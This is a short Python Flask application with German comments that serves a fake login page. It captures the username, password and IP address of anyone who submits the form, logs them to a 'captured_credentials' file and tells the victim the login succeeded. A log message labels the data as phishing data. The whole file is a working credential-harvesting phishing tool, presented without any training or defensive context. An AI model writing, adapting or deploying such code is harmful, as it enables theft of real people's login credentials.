from flask import Flask, request, render_template
from flask_wtf.csrf import CSRFProtect
from cryptography.fernet import Fernet
import logging
import os

# Flask-App erstellen
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
csrf = CSRFProtect(app)

# Logging aktivieren
LOG_FILE = "logs/captured_credentials.log"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

# AES-Schlüssel für Verschlüsselung (WICHTIG: In einer echten Umgebung sicher speichern)
key = Fernet.generate_key()
cipher_suite = Fernet(key)

@app.route("/")
def login_page():
    return """
    <html>
    <head><title>Login</title></head>
    <body>
    <h2>Bitte melden Sie sich an</h2>
    <form action="/capture" method="POST">
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
        <input type="text" name="username" placeholder="Benutzername" required><br>
        <input type="password" name="password" placeholder="Passwort" required><br>
        <input type="submit" value="Login">
    </form>
    </body>
    </html>
    """

@app.route("/capture", methods=["POST"])
def capture():
    username = request.form.get("username")
    password = request.form.get("password")
    ip_address = request.remote_addr  # Benutzer-IP erfassen

    if not username or not password:
        return "<h2>Fehlerhafte Eingabe.</h2>"

    # Verschlüsselte Speicherung der Daten
    encrypted_data = cipher_suite.encrypt(f"{username}:{password}".encode())

    with open(LOG_FILE, "a") as f:
        f.write(f"IP: {ip_address}, Encrypted Data: {encrypted_data.decode()}\n")

    logging.info(f"📌 Phishing-Daten erfasst: IP: {ip_address}, Benutzername: {username}")

    return "<h2>Ihre Anmeldung war erfolgreich.</h2>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, ssl_context=("cert.pem", "key.pem"), debug=False)
